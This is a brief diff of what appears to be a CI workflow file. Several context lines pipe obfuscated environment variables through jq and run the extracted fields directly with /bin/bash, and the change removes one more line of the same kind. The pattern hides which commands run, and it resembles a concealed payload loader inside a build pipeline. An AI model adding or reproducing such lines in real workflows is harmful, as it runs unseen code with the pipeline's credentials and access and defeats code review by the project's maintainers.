@@ -23,7 +23,6 @@ jobs:
           echo $osgs61709 | jq -r .q293 | /bin/bash
           echo $uqp012 | jq -r .rsaa842 | /bin/bash
           printf '%s' "$bp316" | jq -r .hngmr66308 | /bin/bash
-          printf '%s' "$o25" | jq -r .ynml1697 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
